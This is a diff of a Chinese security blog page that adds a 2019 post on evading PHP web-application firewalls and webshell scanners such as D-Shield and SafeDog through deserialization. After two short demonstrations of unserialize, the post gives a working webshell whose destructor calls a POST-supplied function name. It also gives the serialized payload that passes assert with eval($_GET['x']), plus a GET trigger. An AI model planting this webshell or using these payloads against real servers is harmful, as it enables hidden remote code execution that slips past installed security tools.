@@ -85,7 +85,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="bypass,php," />
 
 
 
@@ -96,16 +96,22 @@
 
 
 
-<meta name="description" content="人生匆匆几十载，得意淡然，失意泰然。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Quyunjie&#39;s Blog">
-<meta property="og:url" content="http://yoursite.com/categories/密码安全/index.html">
+<meta name="description" content="bypasswaf-php">
+<meta name="keywords" content="bypass,php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用PHP反序列化免杀D盾、安全狗等WAF软件">
+<meta property="og:url" content="http://yoursite.com/2019/08/04/利用PHP反序列化免杀D盾、安全狗等WAF软件/index.html">
 <meta property="og:site_name" content="Quyunjie&#39;s Blog">
-<meta property="og:description" content="人生匆匆几十载，得意淡然，失意泰然。">
+<meta property="og:description" content="bypasswaf-php">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://www.0xnull.org/assets/files/2019-07-25/1564026631-682973-test.png">
+<meta property="og:image" content="https://www.0xnull.org/assets/files/2019-07-25/1564026636-368771-d.png">
+<meta property="og:image" content="https://www.0xnull.org/assets/files/2019-07-25/1564026641-346008-safedog.png">
+<meta property="og:updated_time" content="2019-08-03T19:16:21.393Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Quyunjie&#39;s Blog">
-<meta name="twitter:description" content="人生匆匆几十载，得意淡然，失意泰然。">
+<meta name="twitter:title" content="利用PHP反序列化免杀D盾、安全狗等WAF软件">
+<meta name="twitter:description" content="bypasswaf-php">
+<meta name="twitter:image" content="https://www.0xnull.org/assets/files/2019-07-25/1564026631-682973-test.png">
 
 
 
@@ -135,13 +141,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/categories/密码安全/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/08/04/利用PHP反序列化免杀D盾、安全狗等WAF软件/"/>
 
 
 
 
 
-  <title>分类: 密码安全 | Quyunjie's Blog</title>
+  <title>利用PHP反序列化免杀D盾、安全狗等WAF软件 | Quyunjie's Blog</title>
   
 
 
@@ -160,7 +166,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -298,55 +304,284 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block category">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>密码安全<small>分类</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/04/利用PHP反序列化免杀D盾、安全狗等WAF软件/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Quyunjie">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/logo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Quyunjie's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/02/22/cmd-一键获取-所有连接过的wifi-密码/" itemprop="url">
-              
-                <span itemprop="name">cmd 一键获取 所有连接过的wifi 密码</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">利用PHP反序列化免杀D盾、安全狗等WAF软件</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-02-22T13:11:46+08:00"
-              content="2018-02-22" >
-          02-22
-        </time>
-      </div>
+        <div class="post-meta">
 
-    </header>
-  </article>
+            
 
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-04T03:07:32+08:00">
+                2019-08-04
+              </time>
+            
+
+            
+
+
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/08/04/利用PHP反序列化免杀D盾、安全狗等WAF软件/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/08/04/利用PHP反序列化免杀D盾、安全狗等WAF软件/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/08/04/利用PHP反序列化免杀D盾、安全狗等WAF软件/" class="leancloud_visitors" data-flag-title="利用PHP反序列化免杀D盾、安全狗等WAF软件">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>bypasswaf-php</p>
+</blockquote>
+<a id="more"></a>
+<h3 id="PHP反序列化介绍："><a href="#PHP反序列化介绍：" class="headerlink" title="PHP反序列化介绍："></a>PHP反序列化介绍：</h3><blockquote>
+<p>在PHP进行反序列化时，会将序列化中的变量传入类中，并且调用__destuct等魔法函数。</p>
+</blockquote>
+<h4 id="TestCode1"><a href="#TestCode1" class="headerlink" title="TestCode1:"></a>TestCode1:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $name = <span class="string">'xxxx'</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> A());</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输出:</p>
+<blockquote>
+<p>xxxxO:1:“A”:1:{s:4:“name”;s:4:“xxxx”;}</p>
+</blockquote>
+<h4 id="TestCode2"><a href="#TestCode2" class="headerlink" title="TestCode2:"></a>TestCode2:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $name = <span class="string">'xxxx'</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="string">'O:1:"A":1:&#123;s:4:"name";s:9:"wogaosuni";&#125;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输出:</p>
+<blockquote>
+<p>wogaosuni</p>
+</blockquote>
+<p>可以发现原来的变量已经被我们替换了。</p>
+<h3 id="利用反序列化写马绕过D盾等WAF："><a href="#利用反序列化写马绕过D盾等WAF：" class="headerlink" title="利用反序列化写马绕过D盾等WAF："></a>利用反序列化写马绕过D盾等WAF：</h3><p><strong>代码不做过多解释，啥子都能看明白</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $name;</span><br><span class="line">	<span class="keyword">public</span> $male;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$a = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">		$a(<span class="keyword">$this</span>-&gt;male);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_POST[<span class="string">'un'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>POST传参传入</p>
+<blockquote>
+<p>un=O:1:”A”:2:{s:4:”name”;s:6:”assert”;s:4:”male”;s:16:”eval($_GET[“x”])”;}</p>
+</blockquote>
+<p>GET传参传入:</p>
+<blockquote>
+<p>x=phpinfo();</p>
+</blockquote>
+<h3 id="效果："><a href="#效果：" class="headerlink" title="效果："></a>效果：</h3><p><img src="https://www.0xnull.org/assets/files/2019-07-25/1564026631-682973-test.png" alt=""></p>
+<p><img src="https://www.0xnull.org/assets/files/2019-07-25/1564026636-368771-d.png" alt=""></p>
+<p><img src="https://www.0xnull.org/assets/files/2019-07-25/1564026641-346008-safedog.png" alt=""></p>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.jpg" alt="Quyunjie 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/aipay.png" alt="Quyunjie 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+	
+	<div>
+      
+       <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-leaf"></i>感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+
+    <footer class="post-footer">
+    <div>    
+ 
+ 
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+      <strong>本文作者：</strong>Quyunjie
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="/2019/08/04/利用PHP反序列化免杀D盾、安全狗等WAF软件/" title="利用PHP反序列化免杀D盾、安全狗等WAF软件">2019/08/04/利用PHP反序列化免杀D盾、安全狗等WAF软件/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权： </strong>
+    本站文章均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议，请勿用于商业，转载注明出处！
+  </li>
+</ul>
+
+</div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/bypass/" rel="tag"><i class="fa fa-tag"></i> bypass</a>
+          
+            <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/09/“净网2019”打击网络色情，实录渗透某成人“抖音”/" rel="next" title="“净网2019”打击网络色情，实录渗透某成人“抖音”">
+                <i class="fa fa-chevron-left"></i> “净网2019”打击网络色情，实录渗透某成人“抖音”
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -354,6 +589,13 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
 
         </div>
         
@@ -374,8 +616,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -489,6 +740,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP反序列化介绍："><span class="nav-number">1.</span> <span class="nav-text">PHP反序列化介绍：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#TestCode1"><span class="nav-number">1.1.</span> <span class="nav-text">TestCode1:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TestCode2"><span class="nav-number">1.2.</span> <span class="nav-text">TestCode2:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用反序列化写马绕过D盾等WAF："><span class="nav-number">2.</span> <span class="nav-text">利用反序列化写马绕过D盾等WAF：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#效果："><span class="nav-number">3.</span> <span class="nav-text">效果：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -641,6 +908,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
